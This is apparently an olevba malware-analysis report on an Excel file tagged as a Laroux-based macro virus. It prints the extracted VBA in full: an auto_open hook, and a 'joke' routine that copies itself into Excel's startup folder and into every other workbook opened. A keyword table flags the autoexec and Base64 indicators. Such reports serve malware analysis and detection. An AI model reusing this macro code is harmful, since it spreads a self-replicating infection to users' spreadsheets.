olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-4650dc8a04d1cba917e40e1d30de11d9557d705a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO jokefile.bas 
in file: Virus.MSExcel.Laroux-based-4650dc8a04d1cba917e40e1d30de11d9557d705a - OLE stream: '_VBA_PROJECT_CUR/VBA/jokefile'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
Application.OnSheetActivate = "joke"
End Sub

Sub joke()
Attribute joke.VB_ProcData.VB_Invoke_Func = " \n14"
C$ = Application.StartupPath
m$ = Dir(C$ & "\" & "jokefile.xls")
If m$ = "jokefile.xls" Then p = 1 Else p = 0
If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
whichfile = p + w * 10

Select Case whichfile
    Case 10
    n4$ = ActiveWorkbook.Name
   ' Sheets("jokefile").Visible = True
    Sheets("jokefile").Select
    
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    'ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "\" & "jokefile.xls", FileFormat:=xlNormal
    ChDir c4$
    Application.OnSheetActivate = ""
    Application.OnSheetActivate = "jokefile!joke"
      
   Case 1
     
   'application.

    n4$ = ActiveWorkbook.Name
    
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "jokefile" Then
        Workbooks("jokefile.xls").Sheets("jokefile").Copy before:=Workbooks(n4$).Sheets(1)
    Else
    End If
    
    Application.OnSheetActivate = ""
    Application.OnSheetActivate = "jokefile.xls!joke"
    Case Else
    End Select
        
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     16 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  jokefil
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  moti 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  moti 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  moti 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

